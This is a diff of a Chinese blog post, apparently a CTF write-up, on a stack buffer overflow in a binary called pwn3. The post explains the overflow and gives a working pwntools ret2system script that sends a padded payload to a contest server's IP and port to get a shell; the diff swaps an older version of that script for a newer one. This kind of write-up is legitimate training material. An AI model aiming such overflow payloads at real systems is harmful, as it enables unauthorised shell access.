@@ -22,7 +22,7 @@
 <meta property="og:site_name" content="4eriri&#39;s blog">
 <meta property="og:description" content="找了半天才找到在哪有栈溢出QAQ 是在输入完用户名再输入1之后， 12345678char s; // [esp+11h] [ebp-17h]printf(&amp;quot;Enter password: &amp;quot;);fflush(stdout);fgets(&amp;amp;s, 100, stdin);puts(&amp;quot;Authentification failed&amp;quot;);fflush(st">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-10-03T08:35:37.684Z">
+<meta property="og:updated_time" content="2018-10-03T09:17:22.807Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="十一欢乐赛-bss_stack">
 <meta name="twitter:description" content="找了半天才找到在哪有栈溢出QAQ 是在输入完用户名再输入1之后， 12345678char s; // [esp+11h] [ebp-17h]printf(&amp;quot;Enter password: &amp;quot;);fflush(stdout);fgets(&amp;amp;s, 100, stdin);puts(&amp;quot;Authentification failed&amp;quot;);fflush(st">
@@ -230,7 +230,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">char s; // [esp+11h] [ebp-17h]</span><br><span class="line"></span><br><span class="line">printf(&quot;Enter password: &quot;);</span><br><span class="line">fflush(stdout);</span><br><span class="line">fgets(&amp;s, 100, stdin);</span><br><span class="line">puts(&quot;Authentification failed&quot;);</span><br><span class="line">fflush(stdout);</span><br><span class="line">return sleep(1u);</span><br></pre></td></tr></table></figure>
 <p>fgets可以读入100个字符，s大小为0x17,所以输入超过0x17+4的话就可以覆盖返回地址。</p>
 <p>这题是有system函数调用的，只是没有/bin/sh字符串，所以只需要找到system地址，再在username地址写入/bin/sh就行了，另外call system的时候会push一个返回地址，再往后才是参数command，因此要留出4个字节的offset脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf=ELF(&apos;./pwn3&apos;)</span><br><span class="line">system=elf.symbols[&apos;system&apos;]</span><br><span class="line">sh=remote(&quot;47.100.40.190&quot;,10011)</span><br><span class="line">sh.recvuntil(&apos;User name : &apos;)</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.recvuntil(&apos;Action: &apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Enter password: &apos;)</span><br><span class="line">payload=&apos;a&apos;*0x17+&apos;a&apos;*4+p32(system)+&apos;a&apos;*4+p32(0x08049dc8)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;47.100.40.190&quot;,10011)</span><br><span class="line">sh.recvuntil(&apos;User name : &apos;)</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.recvuntil(&apos;Action: &apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Enter password: &apos;)</span><br><span class="line">payload=&apos;a&apos;*0x17+&apos;a&apos;*4+p32(0x08048813)+&apos;a&apos;*4+p32(0x08049dc8)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>之后cat flag就可以得到flag了</p>
 
       
@@ -243,7 +243,7 @@
         <p><span>本文标题:</span><a href="/2018/10/03/十一欢乐赛-bss-stack/">十一欢乐赛-bss_stack</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
         <p><span>发布时间:</span>2018-10-03, 16:24:15</p>
-        <p><span>最后更新:</span>2018-10-03, 16:35:37</p>
+        <p><span>最后更新:</span>2018-10-03, 17:17:22</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2018/10/03/十一欢乐赛-bss-stack/" title="十一欢乐赛-bss_stack">http://yoursite.com/2018/10/03/十一欢乐赛-bss-stack/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/10/03/十一欢乐赛-bss-stack/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
